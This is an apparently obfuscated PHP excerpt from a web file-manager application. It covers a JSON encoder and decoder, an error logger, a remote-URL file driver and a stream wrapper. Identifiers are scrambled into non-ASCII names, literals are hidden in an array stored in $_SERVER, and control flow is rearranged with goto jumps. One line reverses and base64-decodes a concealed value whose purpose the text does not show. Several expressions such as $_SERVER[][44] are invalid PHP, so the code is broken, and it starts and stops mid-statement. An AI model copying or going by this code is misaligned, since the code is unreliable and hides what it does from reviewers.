$e¬˜´åîë© = $f»¤—‡ÉŒ[33]; $BÂ ¹Ï¿Æ˜ = strlen($F¶»—¤¥¿ˆ); for ($c‚¡ÛÁŞ–µ = 0; $c‚¡ÛÁŞ–µ < $BÂ ¹Ï¿Æ˜; ++$c‚¡ÛÁŞ–µ) { $EˆğËùìÌ = ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ]); switch (!0) { case $EˆğËùìÌ == 8: $e¬˜´åîë© .= $f»¤—‡ÉŒ[1974]; break; case $EˆğËùìÌ == 9: $e¬˜´åîë© .= $f»¤—‡ÉŒ[1608]; break; case $EˆğËùìÌ == 10: $e¬˜´åîë© .= $f»¤—‡ÉŒ[1606]; break; case $EˆğËùìÌ == 12: $e¬˜´åîë© .= $f»¤—‡ÉŒ[1975]; break; case $EˆğËùìÌ == 13: $e¬˜´åîë© .= $f»¤—‡ÉŒ[1607]; break; case $EˆğËùìÌ == 34: case $EˆğËùìÌ == 47: case $EˆğËùìÌ == 92: $e¬˜´åîë© .= $f»¤—‡ÉŒ[93] . $F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ]; break; case $EˆğËùìÌ >= 32 && $EˆğËùìÌ <= 127: $e¬˜´åîë© .= $F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ]; break; case ($EˆğËùìÌ & 224) == 192: $aø–¹Ô¡¦ = pack($f»¤—‡ÉŒ[1976], $EˆğËùìÌ, ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 1])); $c‚¡ÛÁŞ–µ += 1; $EøíÒßÑÆ’ = $this->utf82utf16($aø–¹Ô¡¦); $e¬˜´åîë© .= sprintf($f»¤—‡ÉŒ[1977], bin2hex($EøíÒßÑÆ’)); break; case ($EˆğËùìÌ & 240) == 224: $aø–¹Ô¡¦ = pack($f»¤—‡ÉŒ[1976], $EˆğËùìÌ, ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 1]), ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 2])); $c‚¡ÛÁŞ–µ += 2; $EøíÒßÑÆ’ = $this->utf82utf16($aø–¹Ô¡¦); $e¬˜´åîë© .= sprintf($f»¤—‡ÉŒ[1977], bin2hex($EøíÒßÑÆ’)); break; case ($EˆğËùìÌ & 248) == 240: $aø–¹Ô¡¦ = pack($f»¤—‡ÉŒ[1976], $EˆğËùìÌ, ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 1]), ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 2]), ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 3])); $c‚¡ÛÁŞ–µ += 3; $EøíÒßÑÆ’ = $this->utf82utf16($aø–¹Ô¡¦); $e¬˜´åîë© .= sprintf($f»¤—‡ÉŒ[1977], bin2hex($EøíÒßÑÆ’)); break; case ($EˆğËùìÌ & 252) == 248: $aø–¹Ô¡¦ = pack($f»¤—‡ÉŒ[1976], $EˆğËùìÌ, ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 1]), ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 2]), ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 3]), ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 4])); $c‚¡ÛÁŞ–µ += 4; $EøíÒßÑÆ’ = $this->utf82utf16($aø–¹Ô¡¦); $e¬˜´åîë© .= sprintf($f»¤—‡ÉŒ[1977], bin2hex($EøíÒßÑÆ’)); break; case ($EˆğËùìÌ & 254) == 252: $aø–¹Ô¡¦ = pack($f»¤—‡ÉŒ[1976], $EˆğËùìÌ, ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 1]), ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 2]), ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 3]), ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 4]), ord($F¶»—¤¥¿ˆ[$c‚¡ÛÁŞ–µ + 5])); $c‚¡ÛÁŞ–µ += 5; $EøíÒßÑÆ’ = $this->utf82utf16($aø–¹Ô¡¦); $e¬˜´åîë© .= sprintf($f»¤—‡ÉŒ[1977], bin2hex($EøíÒßÑÆ’)); break; } } return $f»¤—‡ÉŒ[113] . $e¬˜´åîë© . $f»¤—‡ÉŒ[113]; case $f»¤—‡ÉŒ[1978]: if (is_array($F¶»—¤¥¿ˆ) && count($F¶»—¤¥¿ˆ) && array_keys($F¶»—¤¥¿ˆ) !== range(0, sizeof($F¶»—¤¥¿ˆ) - 1)) { $Cõùƒ¥×”× = array_map(array($this, $f»¤—‡ÉŒ[1979]), array_keys($F¶»—¤¥¿ˆ), array_values($F¶»—¤¥¿ˆ)); foreach ($Cõùƒ¥×”× as $A“•¡¢²åÆ) { if (Services_JSON::isError($A“•¡¢²åÆ)) { return $A“•¡¢²åÆ; } } return $f»¤—‡ÉŒ[1094] . join($f»¤—‡ÉŒ[47], $Cõùƒ¥×”×) . $f»¤—‡ÉŒ[330]; } $c–ğª­ = array_map(array($this, $f»¤—‡ÉŒ[1980]), $F¶»—¤¥¿ˆ); foreach ($c–ğª­ as $EÖòÉáìŠ×) { if (Services_JSON::isError($EÖòÉáìŠ×)) { return $EÖòÉáìŠ×; } } return $f»¤—‡ÉŒ[157] . join($f»¤—‡ÉŒ[47], $c–ğª­) . $f»¤—‡ÉŒ[502]; case $f»¤—‡ÉŒ[1981]: $D˜Œ£âî¬„ = get_object_vars($F¶»—¤¥¿ˆ); $Cõùƒ¥×”× = array_map(array($this, $f»¤—‡ÉŒ[1979]), array_keys($D˜Œ£âî¬„), array_values($D˜Œ£âî¬„)); foreach ($Cõùƒ¥×”× as $A“•¡¢²åÆ) { if (Services_JSON::isError($A“•¡¢²åÆ)) { return $A“•¡¢²åÆ; } } return $f»¤—‡ÉŒ[1094] . join($f»¤—‡ÉŒ[47], $Cõùƒ¥×”×) . $f»¤—‡ÉŒ[330]; default: return $this->use & SERVICES_JSON_SUPPRESS_ERRORS ? $f»¤—‡ÉŒ[99] : new Services_JSON_Error(gettype($F¶»—¤¥¿ˆ) . $f»¤—‡ÉŒ[1982]); } } function name_value($bå×Ù†øŸ­, $d—‚äÍ²¯) { $DíãÄæ¸ÊÜ = $this->encode($d—‚äÍ²¯); if (Services_JSON::isError($DíãÄæ¸ÊÜ)) { return $DíãÄæ¸ÊÜ; } return $this->encode(strval($bå×Ù†øŸ­)) . $_SERVER[åÌÛ»ô¢‚ö™][4] . $DíãÄæ¸ÊÜ; } function reduce_string($b÷ÚĞÏ…â®) { $eŠœç¿İàì =& $_SERVER[åÌÛ»ô¢‚ö™]; $b÷ÚĞÏ…â® = preg_replace(array($eŠœç¿İàì[1983], $eŠœç¿İàì[1984], $eŠœç¿İàì[1985]), $eŠœç¿İàì[33], $b÷ÚĞÏ…â®); return trim($b÷ÚĞÏ…â®); } function decode($fß×ÙñÛ°î) { $cÅ×Ùæ°¶ =& $_SERVER[åÌÛ»ô¢‚ö™]; $fß×ÙñÛ°î = $this->reduce_string($fß×ÙñÛ°î); switch (strtolower($fß×ÙñÛ°î)) { case $cÅ×Ùæ°¶[1630]: return !0; case $cÅ×Ùæ°¶[1632]: return !1; case $cÅ×Ùæ°¶[99]: return null; default: $EÃÊïÏŒÔ² = array(); if (is_numeric($fß×ÙñÛ°î)) { return (double) $fß×ÙñÛ°î == (int) $fß×ÙñÛ°î ? (int) $fß×ÙñÛ°î : (double) $fß×ÙñÛ°î; } elseif (preg_match($cÅ×Ùæ°¶[1986], $fß×ÙñÛ°î, $EÃÊïÏŒÔ²) && $EÃÊïÏŒÔ²[1] == $EÃÊïÏŒÔ²[2]) { $E©¾ø«Ğ‘ç = substr($fß×ÙñÛ°î, 0, 1); $F¼»³®¶ = substr($fß×ÙñÛ°î, 1, -1); $e³ÛŸ¨» = $cÅ×Ùæ°¶[33]; $b¼®¤Š‰ğ = strlen($F¼»³®¶); for ($b´Í»›”Ó = 0; $b´Í»›”Ó < $b¼®¤Š‰ğ; ++$b´Í»›”Ó) { $AĞ‘—Èß¥Ñ = substr($F¼»³®¶, $b´Í»›”Ó, 2); $BÉî©¿Óœà = ord($F¼»³®¶[$b´Í»›”Ó]); switch (!0) { case $AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1974]: $e³ÛŸ¨» .= chr(8); ++$b´Í»›”Ó; break; case $AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1608]: $e³ÛŸ¨» .= chr(9); ++$b´Í»›”Ó; break; case $AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1606]: $e³ÛŸ¨» .= chr(10); ++$b´Í»›”Ó; break; case $AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1975]: $e³ÛŸ¨» .= chr(12); ++$b´Í»›”Ó; break; case $AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1607]: $e³ÛŸ¨» .= chr(13); ++$b´Í»›”Ó; break; case $AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1382]: case $AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1987]: case $AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1601]: case $AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1603]: if ($E©¾ø«Ğ‘ç == $cÅ×Ùæ°¶[113] && $AĞ‘—Èß¥Ñ != $cÅ×Ùæ°¶[1987] || $E©¾ø«Ğ‘ç == $cÅ×Ùæ°¶[55] && $AĞ‘—Èß¥Ñ != $cÅ×Ùæ°¶[1382]) { $e³ÛŸ¨» .= $F¼»³®¶[++$b´Í»›”Ó]; } break; case preg_match($cÅ×Ùæ°¶[1988], substr($F¼»³®¶, $b´Í»›”Ó, 6)): $FáÛÁ¶®è× = chr(hexdec(substr($F¼»³®¶, $b´Í»›”Ó + 2, 2))) . chr(hexdec(substr($F¼»³®¶, $b´Í»›”Ó + 4, 2))); $e³ÛŸ¨» .= $this->utf162utf8($FáÛÁ¶®è×); $b´Í»›”Ó += 5; break; case $BÉî©¿Óœà >= 32 && $BÉî©¿Óœà <= 127: $e³ÛŸ¨» .= $F¼»³®¶[$b´Í»›”Ó]; break; case ($BÉî©¿Óœà & 224) == 192: $e³ÛŸ¨» .= substr($F¼»³®¶, $b´Í»›”Ó, 2); ++$b´Í»›”Ó; break; case ($BÉî©¿Óœà & 240) == 224: $e³ÛŸ¨» .= substr($F¼»³®¶, $b´Í»›”Ó, 3); $b´Í»›”Ó += 2; break; case ($BÉî©¿Óœà & 248) == 240: $e³ÛŸ¨» .= substr($F¼»³®¶, $b´Í»›”Ó, 4); $b´Í»›”Ó += 3; break; case ($BÉî©¿Óœà & 252) == 248: $e³ÛŸ¨» .= substr($F¼»³®¶, $b´Í»›”Ó, 5); $b´Í»›”Ó += 4; break; case ($BÉî©¿Óœà & 254) == 252: $e³ÛŸ¨» .= substr($F¼»³®¶, $b´Í»›”Ó, 6); $b´Í»›”Ó += 5; break; } } return $e³ÛŸ¨»; } elseif (preg_match($cÅ×Ùæ°¶[1989], $fß×ÙñÛ°î) || preg_match($cÅ×Ùæ°¶[1990], $fß×ÙñÛ°î)) { goto fñ£¶ ½õ¶; dÆß±ÏÕ«Í: for ($b´Í»›”Ó = 0; $b´Í»›”Ó <= $b¼®¤Š‰ğ; ++$b´Í»›”Ó) { $bÃªãÃ”œ = end($A›Ê–Ş­); $AĞ‘—Èß¥Ñ = substr($F¼»³®¶, $b´Í»›”Ó, 2); if ($b´Í»›”Ó == $b¼®¤Š‰ğ || $F¼»³®¶[$b´Í»›”Ó] == $cÅ×Ùæ°¶[47] && $bÃªãÃ”œ[$cÅ×Ùæ°¶[1991]] == SERVICES_JSON_SLICE) { $b«º°²ä× = substr($F¼»³®¶, $bÃªãÃ”œ[$cÅ×Ùæ°¶[278]], $b´Í»›”Ó - $bÃªãÃ”œ[$cÅ×Ùæ°¶[278]]); array_push($A›Ê–Ş­, array($cÅ×Ùæ°¶[1991] => SERVICES_JSON_SLICE, $cÅ×Ùæ°¶[278] => $b´Í»›”Ó + 1, $cÅ×Ùæ°¶[1992] => !1)); if (reset($A›Ê–Ş­) == SERVICES_JSON_IN_ARR) { array_push($c‚Îä±Ç¬, $this->decode($b«º°²ä×)); } elseif (reset($A›Ê–Ş­) == SERVICES_JSON_IN_OBJ) { $E‡„Ä´íÔŠ = array(); if (preg_match($cÅ×Ùæ°¶[1993], $b«º°²ä×, $E‡„Ä´íÔŠ)) { $d®Ò‡¾ê = $this->decode($E‡„Ä´íÔŠ[1]); $Eˆœ‚¡¶Û° = $this->decode($E‡„Ä´íÔŠ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $cğã´õÔ¯[$d®Ò‡¾ê] = $Eˆœ‚¡¶Û°; } else { $cğã´õÔ¯->{$d®Ò‡¾ê} = $Eˆœ‚¡¶Û°; } } elseif (preg_match($cÅ×Ùæ°¶[1994], $b«º°²ä×, $E‡„Ä´íÔŠ)) { $d®Ò‡¾ê = $E‡„Ä´íÔŠ[1]; $Eˆœ‚¡¶Û° = $this->decode($E‡„Ä´íÔŠ[2]); if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $cğã´õÔ¯[$d®Ò‡¾ê] = $Eˆœ‚¡¶Û°; } else { $cğã´õÔ¯->{$d®Ò‡¾ê} = $Eˆœ‚¡¶Û°; } } } } elseif (($F¼»³®¶[$b´Í»›”Ó] == $cÅ×Ùæ°¶[113] || $F¼»³®¶[$b´Í»›”Ó] == $cÅ×Ùæ°¶[55]) && $bÃªãÃ”œ[$cÅ×Ùæ°¶[1991]] != SERVICES_JSON_IN_STR) { array_push($A›Ê–Ş­, array($cÅ×Ùæ°¶[1991] => SERVICES_JSON_IN_STR, $cÅ×Ùæ°¶[278] => $b´Í»›”Ó, $cÅ×Ùæ°¶[1992] => $F¼»³®¶[$b´Í»›”Ó])); } elseif ($F¼»³®¶[$b´Í»›”Ó] == $bÃªãÃ”œ[$cÅ×Ùæ°¶[1992]] && $bÃªãÃ”œ[$cÅ×Ùæ°¶[1991]] == SERVICES_JSON_IN_STR && (strlen(substr($F¼»³®¶, 0, $b´Í»›”Ó)) - strlen(rtrim(substr($F¼»³®¶, 0, $b´Í»›”Ó), $cÅ×Ùæ°¶[93]))) % 2 != 1) { array_pop($A›Ê–Ş­); } elseif ($F¼»³®¶[$b´Í»›”Ó] == $cÅ×Ùæ°¶[157] && in_array($bÃªãÃ”œ[$cÅ×Ùæ°¶[1991]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($A›Ê–Ş­, array($cÅ×Ùæ°¶[1991] => SERVICES_JSON_IN_ARR, $cÅ×Ùæ°¶[278] => $b´Í»›”Ó, $cÅ×Ùæ°¶[1992] => !1)); } elseif ($F¼»³®¶[$b´Í»›”Ó] == $cÅ×Ùæ°¶[502] && $bÃªãÃ”œ[$cÅ×Ùæ°¶[1991]] == SERVICES_JSON_IN_ARR) { array_pop($A›Ê–Ş­); } elseif ($F¼»³®¶[$b´Í»›”Ó] == $cÅ×Ùæ°¶[1094] && in_array($bÃªãÃ”œ[$cÅ×Ùæ°¶[1991]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($A›Ê–Ş­, array($cÅ×Ùæ°¶[1991] => SERVICES_JSON_IN_OBJ, $cÅ×Ùæ°¶[278] => $b´Í»›”Ó, $cÅ×Ùæ°¶[1992] => !1)); } elseif ($F¼»³®¶[$b´Í»›”Ó] == $cÅ×Ùæ°¶[330] && $bÃªãÃ”œ[$cÅ×Ùæ°¶[1991]] == SERVICES_JSON_IN_OBJ) { array_pop($A›Ê–Ş­); } elseif ($AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1995] && in_array($bÃªãÃ”œ[$cÅ×Ùæ°¶[1991]], array(SERVICES_JSON_SLICE, SERVICES_JSON_IN_ARR, SERVICES_JSON_IN_OBJ))) { array_push($A›Ê–Ş­, array($cÅ×Ùæ°¶[1991] => SERVICES_JSON_IN_CMT, $cÅ×Ùæ°¶[278] => $b´Í»›”Ó, $cÅ×Ùæ°¶[1992] => !1)); $b´Í»›”Ó++; } elseif ($AĞ‘—Èß¥Ñ == $cÅ×Ùæ°¶[1996] && $bÃªãÃ”œ[$cÅ×Ùæ°¶[1991]] == SERVICES_JSON_IN_CMT) { array_pop($A›Ê–Ş­); $b´Í»›”Ó++; for ($D­ÄÏ…¬¢ = $bÃªãÃ”œ[$cÅ×Ùæ°¶[278]]; $D­ÄÏ…¬¢ <= $b´Í»›”Ó; ++$D­ÄÏ…¬¢) { $F¼»³®¶ = substr_replace($F¼»³®¶, $cÅ×Ùæ°¶[50], $D­ÄÏ…¬¢, 1); } } } if (reset($A›Ê–Ş­) == SERVICES_JSON_IN_ARR) { return $c‚Îä±Ç¬; } elseif (reset($A›Ê–Ş­) == SERVICES_JSON_IN_OBJ) { return $cğã´õÔ¯; } goto e•ŒÁˆ™®; Bò“ö‚öé†: $F¼»³®¶ = $this->reduce_string($F¼»³®¶); if ($F¼»³®¶ == $cÅ×Ùæ°¶[33]) { if (reset($A›Ê–Ş­) == SERVICES_JSON_IN_ARR) { return $c‚Îä±Ç¬; } else { return $cğã´õÔ¯; } } $b¼®¤Š‰ğ = strlen($F¼»³®¶); goto dÆß±ÏÕ«Í; fñ£¶ ½õ¶: if ($fß×ÙñÛ°î[0] == $cÅ×Ùæ°¶[157]) { $A›Ê–Ş­ = array(SERVICES_JSON_IN_ARR); $c‚Îä±Ç¬ = array(); } else { if ($this->use & SERVICES_JSON_LOOSE_TYPE) { $A›Ê–Ş­ = array(SERVICES_JSON_IN_OBJ); $cğã´õÔ¯ = array(); } else { $A›Ê–Ş­ = array(SERVICES_JSON_IN_OBJ); $cğã´õÔ¯ = new stdClass(); } } array_push($A›Ê–Ş­, array($cÅ×Ùæ°¶[1991] => SERVICES_JSON_SLICE, $cÅ×Ùæ°¶[278] => 0, $cÅ×Ùæ°¶[1992] => !1)); $F¼»³®¶ = substr($fß×ÙñÛ°î, 1, -1); goto Bò“ö‚öé†; e•ŒÁˆ™®: } } } function isError($FàÏäÑÚ‚ù, $f††ªÔ­¾ = null) { $AÌç˜Ëí¹„ =& $_SERVER[åÌÛ»ô¢‚ö™]; if (class_exists($AÌç˜Ëí¹„[1997])) { return PEAR::isError($FàÏäÑÚ‚ù, $f††ªÔ­¾); } elseif (is_object($FàÏäÑÚ‚ù) && (get_class($FàÏäÑÚ‚ù) == $AÌç˜Ëí¹„[1998] || is_subclass_of($FàÏäÑÚ‚ù, $AÌç˜Ëí¹„[1998]))) { return !0; } return !1; } } goto E’äÂ´âÀ; D¨–ŞòÎ¥: function beforeShutdownError($F‘¬¡Á¾µÓ = false, $A©÷¯›ø¡ğ = '', $Eö¾‘ˆë„ = '', $Cíğ¨ï ‚Ş = 0) { $c³ªÖÇé±“ =& $_SERVER[]; switch ($F‘¬¡Á¾µÓ) { case E_PARSE: case E_ERROR: case E_CORE_ERROR: case E_COMPILE_ERROR: case E_USER_ERROR: $CÛàÁñœ = $c³ªÖÇé±“[35]; break; case E_WARNING: case E_USER_WARNING: case E_COMPILE_WARNING: case E_RECOVERABLE_ERROR: $CÛàÁñœ = $c³ªÖÇé±“[36]; break; case E_STRICT: $CÛàÁñœ = $c³ªÖÇé±“[37]; break; case E_NOTICE: case E_USER_NOTICE: $CÛàÁñœ = $c³ªÖÇé±“[38]; break; case E_DEPRECATED: case E_USER_DEPRECATED: $CÛàÁñœ = $c³ªÖÇé±“[39]; break; default: break; } if (!$CÛàÁñœ || $CÛàÁñœ == $c³ªÖÇé±“[38] || $CÛàÁñœ == $c³ªÖÇé±“[39]) { return; } $Eö¾‘ˆë„ = $c³ªÖÇé±“[4] . str_replace($_SERVER[$c³ªÖÇé±“[33]], $c³ªÖÇé±“[16], $Eö¾‘ˆë„); $f´ÄùÛ©Àœ = $CÛàÁñœ . $c³ªÖÇé±“[40] . $A©÷¯›ø¡ğ . $c³ªÖÇé±“[40] . $Eö¾‘ˆë„ . $c³ªÖÇé±“[40] . $Cíğ¨ï ‚Ş; write_log($f´ÄùÛ©Àœ . $c³ªÖÇé±“[41] . get_caller_msg(1), $c³ªÖÇé±“[15]); } $_SERVER[$_SERVER[][42]] = $_SERVER[$_SERVER[][33]] . $_SERVER[][43]; $BÃ¢‰·…¼È = strrev(base64_decode($_SERVER[][44])); goto bÎªïÔ÷ê; eˆÁ˜Äƒ¢Æ: class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($e›É…¼Í = false) { } public function exist($f‡¸Ê³øà) { $F•ßÕ£ = $this->info($f‡¸Ê³øà); return $F•ßÕ£[$_SERVER[åÌÛ»ô¢‚ö™][201]]; } public function isFile($e¹ÇŒğáó½) { $B²³æ¡¦ôÂ = $this->info($e¹ÇŒğáó½); return $B²³æ¡¦ôÂ[$_SERVER[åÌÛ»ô¢‚ö™][201]]; } public function isFolder($cŸóÔš«È) { return !1; } public function size($döÍ¸Â„Ç) { $AÒÉƒˆ¡ùè = $this->info($döÍ¸Â„Ç); return $AÒÉƒˆ¡ùè[$_SERVER[åÌÛ»ô¢‚ö™][77]]; } public function info($C†ñ®Éîë) { return $this->infoParse($C†ñ®Éîë); } public function infoAuth($e°†ó“íÛß) { return $this->infoParse($e°†ó“íÛß); } public function infoWithChildren($Cİ‘—÷‚ñ’) { return $this->infoParse($Cİ‘—÷‚ñ’); } public function infoFull($E¬ëâ‚ö) { return $this->infoParse($E¬ëâ‚ö); } private function infoParse($C’µÆ±Ä…Œ) { $F¦¸’İ‚ëÎ =& $_SERVER[åÌÛ»ô¢‚ö™]; $a„œ‰„ä = $this->header($C’µÆ±Ä…Œ); if (!$a„œ‰„ä || !$a„œ‰„ä[$F¦¸’İ‚ëÎ[716]]) { return !1; } $d†–°è¨õŒ = _get($a„œ‰„ä, $F¦¸’İ‚ëÎ[340], 0); $D©ôò¶‹Ç“ = array($F¦¸’İ‚ëÎ[28] => $a„œ‰„ä[$F¦¸’İ‚ëÎ[28]], $F¦¸’İ‚ëÎ[75] => $C’µÆ±Ä…Œ, $F¦¸’İ‚ëÎ[29] => $F¦¸’İ‚ëÎ[171], $F¦¸’İ‚ëÎ[77] => intval($d†–°è¨õŒ), $F¦¸’İ‚ëÎ[165] => get_path_ext($a„œ‰„ä[$F¦¸’İ‚ëÎ[28]]), $F¦¸’İ‚ëÎ[1188] => $d†–°è¨õŒ > 0 && $a„œ‰„ä[$F¦¸’İ‚ëÎ[1314]], $F¦¸’İ‚ëÎ[1189] => !1); return $D©ôò¶‹Ç“; } private function header($f­Şïàæºã) { if (isset(self::$_cacheHeader[$f­Şïàæºã])) { return self::$_cacheHeader[$f­Şïàæºã]; } self::$_cacheHeader[$f­Şïàæºã] = url_header($f­Şïàæºã); return self::$_cacheHeader[$f­Şïàæºã]; } public function hashSimple($aõÅ¦£Ğ£®, $a‘ŒíÈº× = false) { goto a¯›çğ“„; E‡•İñáÓ: if ($E÷¥°Ä×Ù½ <= $A¾•°¶’¥† * $eÊáÍÏØ²ö) { return md5($this->fileSubstr($aõÅ¦£Ğ£®, 0, $E÷¥°Ä×Ù½)) . $E÷¥°Ä×Ù½; } $fğï§±ÍÇÖ = intval($E÷¥°Ä×Ù½ / $eÊáÍÏØ²ö); $eÓŞ•õ»¥® = $dòø©²±Š§[33]; goto Bˆ‚øî„Â; cÄ½ÉÊ³ª: $E÷¥°Ä×Ù½ = $c©ÄíÒ’«İ[$dòø©²±Š§[77]]; $A¾•°¶’¥† = 200; $eÊáÍÏØ²ö = 50; goto E‡•İñáÓ; eå¿“Ïß‚¿: $eÓŞ•õ»¥® .= $this->fileSubstr($aõÅ¦£Ğ£®, $E÷¥°Ä×Ù½ - $A¾•°¶’¥†, $A¾•°¶’¥†); return md5($eÓŞ•õ»¥®) . $E÷¥°Ä×Ù½; goto A¿’š”Ï«; a¯›çğ“„: $dòø©²±Š§ =& $_SERVER[åÌÛ»ô¢‚ö™]; $c©ÄíÒ’«İ = $this->info($aõÅ¦£Ğ£®); if (!$c©ÄíÒ’«İ || !$c©ÄíÒ’«İ[$dòø©²±Š§[201]]) { return !1; } goto cÄ½ÉÊ³ª; Bˆ‚øî„Â: $fàæ©’êä = timeFloat(); $BˆğÈ¶áÛâ = 15; for ($AôÀ¹«§¤ = 0; $AôÀ¹«§¤ < $eÊáÍÏØ²ö; $AôÀ¹«§¤++) { if (timeFloat() - $fàæ©’êä > $BˆğÈ¶áÛâ) { return !1; } $F„±ñ‡ôÖ = $this->fileSubstr($aõÅ¦£Ğ£®, $fğï§±ÍÇÖ * $AôÀ¹«§¤, $A¾•°¶’¥†); if (!$F„±ñ‡ôÖ) { return !1; } $eÓŞ•õ»¥® .= $F„±ñ‡ôÖ; } goto eå¿“Ïß‚¿; A¿’š”Ï«: } public function getContent($D—™Œì¤¤£) { return $this->fileSubstr($D—™Œì¤¤£); } public function fileSubstr($EŞ¥Í‘«Ë, $Aô…åƒ¢Ãõ = 0, $eèø–ÔêÃÔ = -1) { goto E­¼Á¤¯’; E­¼Á¤¯’: $EƒÔƒø‡òĞ =& $_SERVER[åÌÛ»ô¢‚ö™]; $Aµ÷é‰àâ = $this->info($EŞ¥Í‘«Ë); if (!$Aµ÷é‰àâ || !$Aµ÷é‰àâ[$EƒÔƒø‡òĞ[201]] && $Aµ÷é‰àâ[$EƒÔƒø‡òĞ[77]] > 1024 * 1024 * 10) { return !1; } goto F‚İâ–ßµ¾; F‚İâ–ßµ¾: if ($eèø–ÔêÃÔ === -1) { $eèø–ÔêÃÔ = $Aµ÷é‰àâ[$EƒÔƒø‡òĞ[77]]; } if ($eèø–ÔêÃÔ == 0) { return $EƒÔƒø‡òĞ[33]; } $D‹¶ïÕÊù¹ = array($EƒÔƒø‡òĞ[1315] . $Aô…åƒ¢Ãõ . $EƒÔƒø‡òĞ[742] . ($Aô…åƒ¢Ãõ + $eèø–ÔêÃÔ - 1)); goto aß¾±ô™¼; aß¾±ô™¼: $C¤¢ìîì® = url_request($EŞ¥Í‘«Ë, $EƒÔƒø‡òĞ[234], !1, $D‹¶ïÕÊù¹, !1, !1, 1); return $C¤¢ìîì®[$EƒÔƒø‡òĞ[1061]] ? $C¤¢ìîì®[$EƒÔƒø‡òĞ[1061]] : $EƒÔƒø‡òĞ[33]; goto dÓ‚Ø†ÅÖù; dÓ‚Ø†ÅÖù: } public function download($F‰ç•‡‡ß, $fñéğÌá™) { Downloader::start($F‰ç•‡‡ß, $fñéğÌá™); return $fñéğÌá™; } } class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($E³¤ğ¨È—Š, $DÂ‰’¡¹µæ = '') { goto a±šÆ‚íÏğ; D×ïÌÃ×ßá: return $this->info ? !0 : !1; goto CË¿×ùñ¿; a±šÆ‚íÏğ: $this->info = $this->info($E³¤ğ¨È—Š); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[åÌÛ»ô¢‚ö™][75]]; goto Cñ¤õÔ¼İĞ; Cñ¤õÔ¼İĞ: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$E³¤ğ¨È—Š])) { self::$_chunkBuffer[$E³¤ğ¨È—Š] = array(); } goto D×ïÌÃ×ßá; CË¿×ùñ¿: } function stream_read($A¼“·ÉÖ‹) { $eÓã¶ÁÑÌÊ = $this->fileSubstr($this->pose, $A¼“·ÉÖ‹); $this->pose += strlen($eÓã¶ÁÑÌÊ); return $eÓã¶ÁÑÌÊ; } public function stream_tell() { return $this->pose; } public function stream_seek($bø‡Çè¬, $A¤¹ƒÖœÔç) { $a„¾µ®¥šİ =& $_SERVER[åÌÛ»ô¢‚ö™]; if ($A¤¹ƒÖœÔç == SEEK_SET) { $this->pose = $bø‡Çè¬; } else { if ($A¤¹ƒÖœÔç == SEEK_CUR) { $this->pose += $bø‡Çè¬; } else { if ($A¤¹ƒÖœÔç == SEEK_END) { $this->pose = $this->info[$a„¾µ®¥šİ[77]] + intval($bø‡Çè¬); } } } if ($bø‡Çè¬ < 0) { $this->pose = $this->info[$a„¾µ®¥šİ[77]] + $bø‡Çè¬; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[åÌÛ»ô¢‚ö™][77]]; } public function stream_close() { return !0; } public function url_stat($F§ÙğŠŒ“, $cÉâ‚à) { $C—‚ËÊÅÂ =& $_SERVER[åÌÛ»ô¢‚ö™]; $FÎç ì‘Š = $this->info($F§ÙğŠŒ“); return array($C—‚ËÊÅÂ[1316] => 0, $C—‚ËÊÅÂ[1317] => 0, $C—‚ËÊÅÂ[12] => 32768 + 511, $C—‚ËÊÅÂ[1318] => 0, $C—‚ËÊÅÂ[1319] => 0, $C—‚ËÊÅÂ[1320] => 0, $C—‚ËÊÅÂ[1321] => 0, $C—‚ËÊÅÂ[77] => $FÎç ì‘Š[$C—‚ËÊÅÂ[77]], $C—‚ËÊÅÂ[1322] => $FÎç ì‘Š[$C—‚ËÊÅÂ[1193]], $C—‚ËÊÅÂ[1279] => $FÎç ì‘Š[$C—‚ËÊÅÂ[107]], $C—‚ËÊÅÂ[1278] => $FÎç ì‘Š[$C—‚ËÊÅÂ[200]], $C—‚ËÊÅÂ[1323] => 0, $C—‚ËÊÅÂ[1324] => 0); } static $fileInfo = array(); public function info($f¡†øç¦ô) { $AÎ Ôä‡’Í = $_SERVER[åÌÛ»ô¢‚ö™][1325]; if 